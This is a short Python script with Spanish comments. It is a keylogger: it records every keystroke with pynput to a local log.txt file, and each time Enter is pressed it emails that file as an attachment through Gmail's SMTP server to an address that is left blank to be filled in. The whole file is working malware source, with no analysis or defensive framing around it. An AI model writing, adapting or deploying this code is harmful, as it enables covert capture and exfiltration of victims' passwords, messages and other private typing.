import os
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        with open('log.txt','a') as f:
            f.write(str(key))
    except Exception as e:
        print(e)

def on_release(key):
    if key == Key.esc:
        f = open('log.txt','r+')
        biffer= f.read()
        f.close()
        return False
    
    if key == Key.enter:
        send_email()

        
def send_email():
    # Configura tus credenciales de Gmail
    
    gmail_user = ''  
    gmail_password = ''  

    # Configura el destinatario y el asunto del correo
    
    to = ''  
    subject = 'Registro de teclas' 

    # Crea el mensaje de correo
    msg = MIMEMultipart()
    msg['From'] = gmail_user
    msg['To'] = to
    msg['Subject'] = subject

    # Agrega el cuerpo del mensaje (puedes personalizarlo)
    body = 'Este es el registro de teclas que generó el script.'
    msg.attach(MIMEText(body, 'plain'))

    # Adjunta el archivo log.txt al correo
    with open('log.txt', 'r') as log_file:
        attachment = MIMEText(log_file.read())
        attachment.add_header('Content-Disposition', 'attachment', filename='log.txt')
        msg.attach(attachment)

    # Establece una conexión segura con el servidor SMTP de Gmail
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(gmail_user, gmail_password)

    # Envía el correo
    text = msg.as_string()
    server.sendmail(gmail_user, to, text)

    # Cierra la conexión con el servidor SMTP
    server.quit()

          
with Listener(on_release=on_release, on_press=on_press) as listener:
   listener.join()